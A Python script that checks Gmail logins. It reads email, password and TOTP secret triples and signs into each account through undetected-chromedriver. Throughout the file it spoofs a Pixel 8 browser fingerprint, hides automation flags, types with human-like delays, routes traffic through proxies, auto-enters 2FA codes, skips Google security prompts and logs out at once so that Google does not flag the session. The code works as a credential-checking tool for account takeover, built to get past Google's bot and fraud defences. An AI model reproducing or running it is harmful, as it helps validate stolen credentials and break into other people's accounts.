#!/usr/bin/env python3
"""
gmail_uc_checker.py — Gmail login checker via undetected-chromedriver
Called by Node.js browserLoginChecker.ts as a child process.

Input  (stdin):  JSON { "email", "password", "totp"?, "proxy"? }
Output (stdout): JSON { "status", "reason", "totpCode", "debugScreenshot"? }
Logs   (stderr): progress lines prefixed with [UC]
"""
import sys
import json
import os
import time
import random
import base64
import zipfile
import io
import subprocess
import tempfile


# ── Logging ───────────────────────────────────────────────────────────────────

def log(msg: str):
    print(f"[UC] {msg}", file=sys.stderr, flush=True)


# ── Helpers ───────────────────────────────────────────────────────────────────

def rand_sleep(min_ms: int, max_ms: int):
    time.sleep(random.uniform(min_ms / 1000, max_ms / 1000))


def human_type(element, text: str):
    """Type text character by character with realistic random delays."""
    for char in text:
        element.send_keys(char)
        # Most keystrokes: 60-160ms, occasional pause (typo-think)
        delay = random.uniform(0.06, 0.16)
        if random.random() < 0.05:  # 5% chance of longer pause
            delay += random.uniform(0.2, 0.5)
        time.sleep(delay)


def move_to_element(driver, element):
    """Move mouse naturally to element before interacting."""
    try:
        from selenium.webdriver.common.action_chains import ActionChains
        ac = ActionChains(driver)
        ac.move_to_element(element)
        ac.pause(random.uniform(0.1, 0.3))
        ac.perform()
    except Exception:
        pass


STEALTH_JS = """
// Hide webdriver flag
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });

// Mobile: no plugins (real Android Chrome has none)
Object.defineProperty(navigator, 'plugins', { get: () => { var p = []; p.length = 0; return p; } });

// Mobile languages
Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });

// Pixel 8 hardware profile
Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });

// Mobile screen — Pixel 8 (412x915 logical, devicePixelRatio=2.625)
Object.defineProperty(screen, 'width',       { get: () => 412 });
Object.defineProperty(screen, 'height',      { get: () => 915 });
Object.defineProperty(screen, 'availWidth',  { get: () => 412 });
Object.defineProperty(screen, 'availHeight', { get: () => 891 });
Object.defineProperty(screen, 'colorDepth',  { get: () => 24 });
Object.defineProperty(screen, 'pixelDepth',  { get: () => 24 });
Object.defineProperty(window, 'devicePixelRatio', { get: () => 2.625 });

// Mobile: maxTouchPoints = 5 (key signal Google checks)
Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 });

// Platform must match Android UA
Object.defineProperty(navigator, 'platform', { get: () => 'Linux armv81' });

// Mobile: no appVersion mismatch
Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });

// Remove automation-specific chrome properties
if (window.chrome && window.chrome.app) {
  try { delete window.chrome.app; } catch(e) {}
}

// Fake notification permission
if (window.Notification) {
  Object.defineProperty(Notification, 'permission', { get: () => 'default' });
}

// Touch support — real Android device always has ontouchstart
window.ontouchstart = function(){};

// ── WebGL fingerprint spoof — Pixel 8 uses Adreno 740 ──────────────────────
(function() {
  var getParam = WebGLRenderingContext.prototype.getParameter;
  WebGLRenderingContext.prototype.getParameter = function(param) {
    // UNMASKED_VENDOR_WEBGL
    if (param === 37445) return 'Qualcomm';
    // UNMASKED_RENDERER_WEBGL
    if (param === 37446) return 'Adreno (TM) 740';
    return getParam.call(this, param);
  };
  if (window.WebGL2RenderingContext) {
    var getParam2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = function(param) {
      if (param === 37445) return 'Qualcomm';
      if (param === 37446) return 'Adreno (TM) 740';
      return getParam2.call(this, param);
    };
  }
})();

// ── Canvas fingerprint noise — prevents identical canvas hashes ─────────────
(function() {
  var origToDataURL = HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL = function(type) {
    var ctx = this.getContext('2d');
    if (ctx) {
      // Add imperceptible noise — changes fingerprint hash but looks identical
      var imageData = ctx.getImageData(0, 0, this.width || 1, this.height || 1);
      if (imageData.data.length > 0) {
        imageData.data[0] = imageData.data[0] ^ 1;
        ctx.putImageData(imageData, 0, 0);
      }
    }
    return origToDataURL.apply(this, arguments);
  };
})();

// ── AudioContext fingerprint noise ──────────────────────────────────────────
if (window.AudioContext || window.webkitAudioContext) {
  var AC = window.AudioContext || window.webkitAudioContext;
  var origCreateOscillator = AC.prototype.createOscillator;
  AC.prototype.createOscillator = function() {
    var osc = origCreateOscillator.call(this);
    var origStart = osc.start.bind(osc);
    osc.start = function(when) { return origStart(when || 0); };
    return osc;
  };
}
"""


def get_chromium_path() -> str | None:
    for cmd in ("chromium", "chromium-browser", "google-chrome"):
        try:
            p = subprocess.check_output(["which", cmd], encoding="utf8", stderr=subprocess.DEVNULL).strip()
            if p:
                return p
        except Exception:
            pass
    nix = "/nix/store/qa9cnw4v5xkxyip6mb9kxqfq1z4x2dx1-chromium-138.0.7204.100/bin/chromium"
    if os.path.exists(nix):
        return nix
    return None


def parse_proxy(proxy_url: str) -> dict | None:
    try:
        from urllib.parse import urlparse
        p = urlparse(proxy_url)
        return {
            "scheme": p.scheme or "http",
            "host": p.hostname,
            "port": p.port or 3128,
            "username": p.username,
            "password": p.password,
        }
    except Exception:
        return None


def make_proxy_extension(host: str, port: int, username: str, password: str) -> str:
    """
    Build a Manifest-V2 Chrome extension zip that handles proxy auth.
    Returns the path to the zip file (caller must delete it).
    """
    manifest = json.dumps({
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": [
            "proxy", "tabs", "unlimitedStorage", "storage",
            "<all_urls>", "webRequest", "webRequestBlocking"
        ],
        "background": {"scripts": ["background.js"]},
        "minimum_chrome_version": "22.0.0"
    })
    background_js = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{ scheme: "http", host: {json.dumps(host)}, port: parseInt("{port}") }},
        bypassList: ["localhost"]
    }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
function callbackFn(details) {{
    return {{ authCredentials: {{ username: {json.dumps(username)}, password: {json.dumps(password)} }} }};
}}
chrome.webRequest.onAuthRequired.addListener(callbackFn, {{urls: ["<all_urls>"]}}, ["blocking"]);
"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("manifest.json", manifest)
        z.writestr("background.js", background_js)
    buf.seek(0)

    fd, path = tempfile.mkstemp(suffix=".zip", prefix="vanguard_proxy_")
    os.close(fd)
    with open(path, "wb") as f:
        f.write(buf.read())
    return path


def generate_totp(secret: str) -> str | None:
    try:
        import pyotp
        # Strip spaces and uppercase (Google Authenticator shows keys with spaces)
        clean = secret.replace(" ", "").replace("\t", "").upper()
        return pyotp.TOTP(clean).now()
    except Exception as e:
        log(f"TOTP error: {e}")
        return None


def ensure_xvfb() -> str | None:
    """Start Xvfb on :99 if DISPLAY is not set. Returns display string or None."""
    display = os.environ.get("DISPLAY")
    if display:
        return display
    try:
        # Kill any stale Xvfb first
        subprocess.run(["pkill", "-f", "Xvfb :99"], capture_output=True)
        time.sleep(0.3)
        subprocess.Popen(
            ["Xvfb", ":99", "-screen", "0", "1366x768x24", "-ac"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(1.0)
        os.environ["DISPLAY"] = ":99"
        log("Xvfb started on :99")
        return ":99"
    except Exception as e:
        log(f"Xvfb unavailable: {e}")
        return None


# ── Main entry ────────────────────────────────────────────────────────────────

def main():
    try:
        raw = sys.stdin.read()
        data = json.loads(raw)
    except Exception as e:
        print(json.dumps({"status": "unknown", "reason": f"Bad input JSON: {e}", "totpCode": None}), flush=True)
        return

    email = data.get("email", "")
    password = data.get("password", "")
    totp_secret = data.get("totp")
    proxy = data.get("proxy")

    result = check_gmail(email, password, totp_secret, proxy)
    print(json.dumps(result), flush=True)


# ── Browser check ─────────────────────────────────────────────────────────────

def check_gmail(email: str, password: str, totp_secret: str | None, proxy: str | None) -> dict:
    totp_code = generate_totp(totp_secret) if totp_secret else None

    try:
        import undetected_chromedriver as uc
    except ImportError:
        return {
            "status": "unknown",
            "reason": "undetected-chromedriver not installed. Run: pip install -r requirements.txt",
            "totpCode": totp_code,
        }

    display = ensure_xvfb()
    headless = display is None
    chromium_path = get_chromium_path()
    log(f"Chromium: {chromium_path}, headless={headless}, display={display}")

    # Persistent profile per email — Google sees same "device" every time
    safe_email = email.replace("@", "_at_").replace(".", "_")
    profile_dir = os.path.join(tempfile.gettempdir(), "gmail_checker_profiles", safe_email)
    os.makedirs(profile_dir, exist_ok=True)
    log(f"Chrome profile: {profile_dir}")

    options = uc.ChromeOptions()
    options.add_argument(f"--user-data-dir={profile_dir}")
    proxy_ext_path: str | None = None

    # Proxy configuration
    if proxy:
        proxy_info = parse_proxy(proxy)
        if proxy_info and proxy_info["host"]:
            log(f"Proxy: {proxy_info['host']}:{proxy_info['port']} user={proxy_info.get('username')}")
            if proxy_info.get("username") and not headless:
                # Extension-based auth (requires non-headless / virtual display)
                proxy_ext_path = make_proxy_extension(
                    proxy_info["host"], proxy_info["port"],
                    proxy_info["username"], proxy_info.get("password") or ""
                )
                options.add_extension(proxy_ext_path)
                log("Proxy auth extension loaded")
            else:
                # Without extension: set proxy server (auth challenge won't be answered)
                options.add_argument(
                    f'--proxy-server=http://{proxy_info["host"]}:{proxy_info["port"]}'
                )

    # Chrome flags
    # Android mobile fingerprint — looks like a real phone to Google
    MOBILE_UA = (
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/138.0.7204.100 Mobile Safari/537.36"
    )
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    # Mobile viewport — 412×915 matches Pixel 8
    options.add_argument("--window-size=412,915")
    options.add_argument("--lang=en-US,en")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-save-password-bubble")
    options.add_argument("--disable-translate")
    options.add_argument("--disable-infobars")
    options.add_argument("--password-store=basic")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-features=IsolateOrigins,site-per-process")
    options.add_argument(f"--user-agent={MOBILE_UA}")
    # Enable touch events so Google sees a touch-capable device
    options.add_argument("--touch-events=enabled")
    if headless:
        options.add_argument("--disable-gpu")

    log(f"Launching Chrome (UC)…")
    try:
        driver = uc.Chrome(
            options=options,
            browser_executable_path=chromium_path,
            headless=headless,
            version_main=138,
            use_subprocess=True,
        )
    except Exception as e:
        _cleanup(proxy_ext_path)
        return {
            "status": "unknown",
            "reason": f"Chrome launch failed: {str(e)[:300]}",
            "totpCode": totp_code,
        }

    log("Chrome launched")

    # Inject stealth patches on every new page
    try:
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": STEALTH_JS})
        log("Stealth JS injected via CDP")
    except Exception as e:
        log(f"Stealth JS warning: {e}")

    try:
        return _do_login(driver, email, password, totp_code)
    except Exception as e:
        log(f"Login exception: {e}")
        return {"status": "unknown", "reason": f"Login error: {str(e)[:300]}", "totpCode": totp_code}
    finally:
        try:
            driver.quit()
        except Exception:
            pass
        _cleanup(proxy_ext_path)


def _cleanup(path: str | None):
    if path and os.path.exists(path):
        try:
            os.unlink(path)
        except Exception:
            pass


# ── Login flow ────────────────────────────────────────────────────────────────

def _do_login(driver, email: str, password: str, totp_code: str | None) -> dict:
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys

    def page_state():
        url = driver.current_url
        try:
            text = driver.find_element(By.TAG_NAME, "body").text.lower()
        except Exception:
            text = ""
        return url, text

    def screenshot_b64() -> str | None:
        try:
            return f"data:image/jpeg;base64,{base64.b64encode(driver.get_screenshot_as_png()).decode()}"
        except Exception:
            return None

    def get_hostname(url: str) -> str:
        """Return the actual hostname from the URL (not query string)."""
        try:
            from urllib.parse import urlparse
            return urlparse(url).hostname or ""
        except Exception:
            return ""

    def classify(url: str, text: str) -> dict | None:
        host = get_hostname(url)
        # Must literally BE at mail.google.com — not just have it in a ?continue= param
        at_mailbox = host == "mail.google.com" or host.endswith(".mail.google.com")

        has_compose = False
        if at_mailbox:
            try:
                has_compose = len(driver.find_elements(By.CSS_SELECTOR,
                    '[gh="cm"],[data-tooltip="Compose"],[aria-label="Compose"]')) > 0
            except Exception:
                pass

        has_inbox_text = False
        if at_mailbox:
            has_inbox_text = (
                "compose" in text
                or ("inbox" in text and "sign in" not in text and "create an account" not in text)
                or ("primary" in text and at_mailbox)
            )

        if at_mailbox and (has_compose or has_inbox_text or "mail/u/" in url):
            rand_sleep(1500, 2000)
            shot = screenshot_b64()
            # ── Logout immediately so Google doesn't flag a suspicious active session ──
            try:
                log("Mailbox opened — logging out to avoid suspicious-session flag")
                driver.get("https://accounts.google.com/Logout?continue=https://mail.google.com")
                rand_sleep(1500, 2500)
                log("Logout complete")
            except Exception as _le:
                log(f"Logout warning (non-fatal): {_le}")
            return {
                "status": "opened",
                "reason": "Mailbox opened successfully ✅",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        if any(x in text for x in [
            "couldn't find your google account", "no account found",
            "find your google account"
        ]):
            return {"status": "wrong_password", "reason": "Google account not found", "totpCode": totp_code}

        if any(x in text for x in [
            "wrong password", "didn't recognize", "password you entered",
            "incorrect password", "that password is incorrect"
        ]) or any(x in url for x in ["WrongPassword", "wrongpassword"]):
            return {"status": "wrong_password", "reason": "Wrong password", "totpCode": totp_code}

        # "challenge/pwd" is the NORMAL password page — do NOT flag it as verification
        is_real_challenge = (
            ("challenge" in url and "challenge/pwd" not in url)
            or "InterstitialConfirmation" in url
            or ("verify" in url and "mail" not in url and "challenge/pwd" not in url)
        )
        if any(x in text for x in [
            "verify your identity", "verify it's you", "choose a way to verify",
            "confirm it's you", "unusual activity", "suspicious activity",
            "protect your account"
        ]) or is_real_challenge:
            shot = screenshot_b64()
            return {
                "status": "verification_required",
                "reason": "Google is asking for phone/device verification",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        return None

    def wait_for_any(selectors: list[str], timeout: int = 12) -> object | None:
        """Wait for any of the CSS selectors and return the first visible element."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            for sel in selectors:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    if el.is_displayed():
                        return el
                except Exception:
                    pass
            time.sleep(0.3)
        return None

    # ── Step 1: Warm up on google.com ────────────────────────────────────────
    log(f"{email} — Step 1: warming up google.com")
    try:
        driver.get("https://www.google.com")
        rand_sleep(1200, 2200)
        # Simulate reading the page — scroll down slowly
        driver.execute_script("window.scrollBy(0, 150)")
        rand_sleep(300, 600)
        driver.execute_script("window.scrollBy(0, 100)")
        rand_sleep(400, 900)
        driver.execute_script("window.scrollBy(0, -80)")
        rand_sleep(500, 1000)
    except Exception as e:
        log(f"Warmup warning: {e}")

    # ── Step 1b: Navigate to Gmail sign-in ───────────────────────────────────
    log(f"{email} — Step 1b: navigating to sign-in page")
    try:
        driver.get(
            "https://accounts.google.com/v3/signin/identifier"
            "?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F"
            "&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
        )
        rand_sleep(1500, 2500)
    except Exception as e:
        return {"status": "unknown", "reason": f"Navigation failed: {str(e)[:200]}", "totpCode": totp_code}

    url, text = page_state()
    log(f"{email} — After nav: {url[:70]}")

    if "signin/rejected" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": "Google rejected sign-in (automation detected). Use a residential proxy.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    result = classify(url, text)
    if result:
        return result

    # ── Step 2: Enter email ───────────────────────────────────────────────────
    log(f"{email} — Step 2: typing email")
    email_field = wait_for_any([
        "#identifierId",
        'input[type="email"]',
        'input[name="identifier"]',
        'input[autocomplete="username"]',
        'input[name="Email"]',
    ], timeout=12)

    if not email_field:
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Email field not found. URL: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    move_to_element(driver, email_field)
    rand_sleep(200, 400)
    email_field.click()
    rand_sleep(300, 600)
    human_type(email_field, email)
    rand_sleep(500, 900)
    email_field.send_keys(Keys.ENTER)
    rand_sleep(2500, 3500)

    url, text = page_state()
    log(f"{email} — After email submit: {url[:70]}")

    if "signin/rejected" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": "Google rejected sign-in (automation detected). Use a residential proxy.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    result = classify(url, text)
    if result:
        return result

    # ── Step 3: Enter password ────────────────────────────────────────────────
    log(f"{email} — Step 3: typing password")
    pw_field = wait_for_any([
        'input[name="Passwd"]',
        'input[type="password"]:not([name="hiddenPassword"])',
        'input[name="password"]',
        '#password input',
    ], timeout=12)

    if not pw_field:
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": f"Password field not found. URL: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    move_to_element(driver, pw_field)
    rand_sleep(200, 400)
    pw_field.click()
    rand_sleep(300, 500)
    human_type(pw_field, password)
    rand_sleep(500, 900)
    pw_field.send_keys(Keys.ENTER)
    rand_sleep(2500, 3500)

    url, text = page_state()
    log(f"{email} — After password submit: {url[:70]}")

    # ── Quick wrong-password check (before anything else) ─────────────────────
    if any(x in text for x in [
        "wrong password", "didn't recognize", "that password is incorrect",
        "incorrect password", "password you entered"
    ]) or any(x in url for x in ["WrongPassword", "wrongpassword"]):
        return {"status": "wrong_password", "reason": "Wrong password", "totpCode": totp_code}

    # ── Step 4: 2FA — check BEFORE classify so we handle it ourselves ─────────

    # Detect method-selection page ("2-Step Verification — choose how you want")
    is_2fa_select = any(x in text for x in [
        "2-step verification",
        "choose how you want to sign in",
        "how do you want to sign in",
        "verify it's you",
    ])

    # Detect direct TOTP-input page (input already visible)
    totp_field = None
    try:
        totp_field = driver.find_element(By.CSS_SELECTOR,
            'input[name="totpPin"],input[name="Pin"],input[id="totpPin"],'
            'input[autocomplete="one-time-code"],input[aria-label*="code"]')
    except Exception:
        pass

    if is_2fa_select and totp_field is None:
        log(f"{email} — 2FA method-selection page detected")
        if not totp_code:
            shot = screenshot_b64()
            return {
                "status": "2fa_required",
                "reason": "2FA required — add TOTP secret as 3rd field: email:password:totp_secret",
                "totpCode": None,
                "debugScreenshot": shot,
            }

        # Click the Google Authenticator option
        log(f"{email} — Clicking 'Google Authenticator' option")
        try:
            driver.execute_script("""
                // Try by data-challengetype (totp = 6)
                var byType = document.querySelector('[data-challengetype="6"]');
                if (byType) { byType.click(); return; }
                // Try by visible text containing "authenticator"
                var allEls = Array.from(document.querySelectorAll(
                    'li, div[role="listitem"], [data-challengetype]'));
                var found = allEls.find(function(el) {
                    return el.innerText && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                });
                if (found) { found.click(); return; }
                // Broader fallback — any clickable element with the word
                var broader = Array.from(document.querySelectorAll('*')).find(function(el) {
                    return el.children.length === 0
                        && el.innerText
                        && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                });
                if (broader) broader.click();
            """)
        except Exception as e:
            log(f"Authenticator click error: {e}")

        rand_sleep(1800, 2800)

        # Wait for the TOTP input to appear
        totp_field = wait_for_any([
            'input[name="totpPin"]', 'input[name="Pin"]', 'input[id="totpPin"]',
            'input[autocomplete="one-time-code"]', 'input[type="tel"]',
            'input[aria-label*="code"]',
        ], timeout=12)

        url, text = page_state()
        log(f"{email} — After authenticator click: {url[:70]}")

    # ── Enter TOTP code (whether we just navigated here or were already here) ─
    if totp_field is not None:
        if not totp_code:
            shot = screenshot_b64()
            return {"status": "2fa_required", "reason": "2FA required — provide TOTP secret", "totpCode": None, "debugScreenshot": shot}

        log(f"{email} — Entering TOTP code: {totp_code}")
        try:
            move_to_element(driver, totp_field)
            rand_sleep(150, 300)
            totp_field.clear()
            rand_sleep(100, 200)
            human_type(totp_field, totp_code)
            rand_sleep(400, 600)
            totp_field.send_keys(Keys.ENTER)
        except Exception as e:
            log(f"TOTP entry error: {e}")

        rand_sleep(1500, 2500)

        # Wait for Gmail to fully load (signin/continue is an auto-redirect page)
        log(f"{email} — Waiting for Gmail redirect after TOTP…")
        deadline = time.time() + 30
        while time.time() < deadline:
            url = driver.current_url
            if "mail.google.com" in get_hostname(url):
                break
            # signin/continue may need a button click to proceed
            if "signin/continue" in url:
                try:
                    driver.execute_script("""
                        var btn = document.querySelector(
                            '#confirm, button[type="submit"], [data-action], button');
                        if (btn) btn.click();
                    """)
                except Exception:
                    pass
            time.sleep(1.0)

        rand_sleep(1500, 2500)
        url, text = page_state()
        log(f"{email} — After TOTP submit (final): {url[:70]}")

        # Wrong TOTP
        if any(x in text for x in [
            "wrong code", "that code didn't work", "code is incorrect",
            "enter the code again", "code expired"
        ]):
            return {
                "status": "wrong_password",
                "reason": f"TOTP code {totp_code} was wrong or expired",
                "totpCode": totp_code,
            }

        result = classify(url, text)
        if result:
            return result

    # ── Classify whatever page we're on ───────────────────────────────────────
    result = classify(url, text)
    if result:
        return result

    # ── Post-login interstitial handler ───────────────────────────────────────
    # Google often shows recovery/address/terms screens before landing on Gmail.
    # Strategy: try to dismiss nicely first; if still not at Gmail after a few
    # attempts, force-navigate directly to the inbox.
    for _attempt in range(8):
        url, text = page_state()
        host = get_hostname(url)

        if "mail.google.com" in host:
            break

        dismissed = False

        # gds.google.com — recovery options, home address, etc. (optional Google setup pages)
        if "gds.google.com" in host:
            log(f"{email} — gds interstitial ({url[url.find('/web/'):][:40]}), skipping to Gmail")
            try:
                driver.get("https://mail.google.com/mail/u/0/#inbox")
            except Exception:
                pass
            dismissed = True

        # uplevelingstep — Google account security upgrade prompt (skip it)
        elif "uplevelingstep" in url:
            log(f"{email} — uplevelingstep interstitial, skipping to Gmail")
            try:
                driver.get("https://mail.google.com/mail/u/0/#inbox")
            except Exception:
                pass
            dismissed = True

        # signin/continue redirect page
        elif "signin/continue" in url:
            log(f"{email} — signin/continue, navigating directly to Gmail")
            try:
                driver.get("https://mail.google.com/mail/u/0/#inbox")
            except Exception:
                pass
            dismissed = True

        # Any accounts.google.com interstitial — try clicking primary CTA
        elif "accounts.google.com" in host:
            log(f"{email} — accounts interstitial ({url[:60]}), trying to proceed")
            try:
                driver.execute_script("""
                    var btn = document.querySelector(
                        'button[type="submit"], #confirm, [data-action="confirm"], button');
                    if (btn) btn.click();
                """)
                dismissed = True
            except Exception:
                pass

        else:
            # Not at Gmail and not a known interstitial — force navigate
            log(f"{email} — unknown page ({url[:60]}), forcing Gmail navigation")
            try:
                driver.get("https://mail.google.com/mail/u/0/#inbox")
                dismissed = True
            except Exception:
                break

        if dismissed:
            rand_sleep(2500, 3500)
        else:
            break

    # Wait for Gmail to fully load
    deadline = time.time() + 25
    while time.time() < deadline:
        if "mail.google.com" in get_hostname(driver.current_url):
            break
        time.sleep(0.8)

    rand_sleep(1500, 2500)
    url, text = page_state()
    log(f"{email} — Final page after interstitials: {url[:70]}")

    result = classify(url, text)
    if result:
        return result

    # ── True final fallback ───────────────────────────────────────────────────
    shot = screenshot_b64()
    return {
        "status": "unknown",
        "reason": f"Unexpected page: {url[:80]}",
        "totpCode": totp_code,
        "debugScreenshot": shot,
    }


if __name__ == "__main__":
    main()
